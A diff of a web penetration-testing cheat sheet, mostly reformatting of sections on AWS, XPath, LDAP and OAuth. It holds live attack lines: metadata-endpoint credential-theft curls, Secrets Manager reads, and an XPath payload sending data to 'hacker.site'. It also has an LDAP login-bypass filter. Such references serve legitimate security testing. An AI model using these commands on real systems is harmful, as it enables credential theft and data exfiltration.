@@ -471,15 +471,19 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 
 `echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read`
 
-### Meta-data
+### Tricks in AWS 
 
-`curl http://169.254.169.254/latest/api/token`  
-`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`   
+-> Meta-data  
+```
+curl http://169.254.169.254/latest/api/token 
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```   
 
--> Models  
-`http://<BUCKETNAME>.s3.amazonaws.com/`
+-> Models s3  
+`http://<BUCKETNAME>.s3.amazonaws.com/`  
 or  
 `http://s3.amazonaws.com/<BUCKETNAME>/`
+-> Recon  
 ```
 export AWS_ACCESS_KEY_ID=<access_key_id>   
 export AWS_SECRET_ACCESS_KEY=<secret_access_key>  
@@ -502,7 +506,7 @@ aws ec2 describe-instances  --profile myprofile
 aws secretsmanager list-secrets --profile myprofile --region=us-east-1  
 aws secretsmanager get-secret-value --secret-id <secret> --profile myprofile --region=us-east-1
 ```
-### EKS
+-> EKS  
 
 ```
 aws eks list-clusters --region us-east-1  
@@ -524,7 +528,6 @@ https://github.com/RhinoSecurityLabs/pacu
 `* and doc('http://hacker.site/', name(/*) ))`  
   
 ### Tool
-  
 https://xcat.readthedocs.io/en/latest/
   
 ### Wordlists for SQLI e XPath - Authentication Bypass
@@ -532,7 +535,6 @@ https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/I
 https://pastebin.com/raw/rKpsMp0g  
 
 ## LDAP query and LDAP Injection
-
 ### LDAP Injection - Bypass Login
 
 ```$filter = "(&(uid=$username)(userPassword=$password))";```  
@@ -554,14 +556,12 @@ or
 https://github.com/dinigalab/ldapsearch
 
 ### Docs
-  
 https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
 https://book.hacktricks.xyz/pentesting-web/ldap-injection
 
 ## Attacking OAuth
  
 ### Workflow OAuth Authorization Code Grant Type
-
 1- 
   
 ```
